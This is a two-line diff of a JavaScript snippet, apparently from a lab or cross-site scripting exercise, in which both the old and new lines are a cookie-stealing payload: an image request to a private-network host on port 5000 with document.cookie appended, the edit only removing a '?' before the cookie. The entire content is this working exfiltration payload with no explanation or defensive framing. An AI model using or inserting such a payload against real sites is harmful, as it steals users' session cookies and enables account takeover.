@@ -1,2 +1,2 @@
-new Image().src='http://192.168.56.1:5000?'+document.cookie
+new Image().src='http://192.168.56.1:5000'+document.cookie
 
